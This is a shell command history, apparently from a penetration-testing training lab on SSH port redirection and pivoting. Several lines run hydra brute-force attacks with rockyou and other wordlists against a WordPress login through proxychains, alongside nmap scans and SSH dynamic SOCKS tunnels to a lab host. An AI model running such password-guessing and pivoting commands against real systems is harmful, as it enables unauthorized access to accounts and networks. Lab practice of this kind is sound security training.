+ 2029  proxychains hydra -l offsec -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F127.0.0.1%2Fwp-admin%2F&testcookie=1:Error" -F
+ 2030  proxychains hydra -l offsec -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F127.0.0.1%2Fwp-admin%2F&testcookie=1:Error" -vF
+ 2032  proxychains hydra -l offsec -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F127.0.0.1%2Fwp-admin%2F&testcookie=1:Error" -vVF
+ 2033  proxychains hydra -l offsec -P /usr/share/wordlists/john.list 127.0.0.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F127.0.0.1%2Fwp-admin%2F&testcookie=1:Error" -vVF
+ 2034  proxychains hydra -l offsec -P /usr/share/wordlists/john.lst 127.0.0.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F127.0.0.1%2Fwp-admin%2F&testcookie=1:Error" -vVF
+ 2035  proxychains hydra -l offsec -P /usr/share/wordlists/fastrack.txt 127.0.0.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F127.0.0.1%2Fwp-admin%2F&testcookie=1:Error" -vVF
+ 2036  proxychains hydra -l offsec -P /usr/share/wordlists/fasttrack.txt 127.0.0.1 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F127.0.0.1%2Fwp-admin%2F&testcookie=1:Error" -vVF
+ 2037  curl http://192.168.121.52
+ 2038  curl http://192.168.121.52:1080
+ 2039  proxychains bash
+ 2040  proxychains nmap --top-ports=20 -sT -Pn $IP
+ 2041  proxychains nmap --top-ports=20 -sT -Pn 192.168.121.52
+ 2042  proxychains nmap --top-ports=20 -sT -Pn 127.0.0.1
+ 2043  proxychains curl 127.0.0.1
+ 2044  clear
+ 2046  sudo nano -ilm /etc/proxychains.conf
+ 2047  proxychains firefox
+ 2048  export IP=192.168.121.52
+ 2049  ping $IP
+ 2050  ssh -D 8888 student@$IP\n
+ 2051  ssh -D 8888 student@$IP -p 2222\n
+ 2052  ssh -N -D 0.0.0.0:8888 student@$IP -p 2222\n
+ 2053  ssh -N -D 0.0.0.0:9000 student@$IP -p 2222\n
+ 2054  ssh -D 1080 student@$IP -p 2222\n
+ 2055  ssh -D 1080 student@$IP -p 2222 -N\n
+ 2056  ssh -D 1080 student@$IP -p 2222 -N -vv\n
+ 2057  ssh -D 1080 student@$IP -p 2222 -N -v
+ 2058  echo $IP
+ 2059  sudo ssh -N -D 127.0.0.1:8080 student@$IP -p 2222
+ 2060  git add --all
+ 2061  git commit -m "finished port redirection"
+ 2062  git push
+ 2063  history
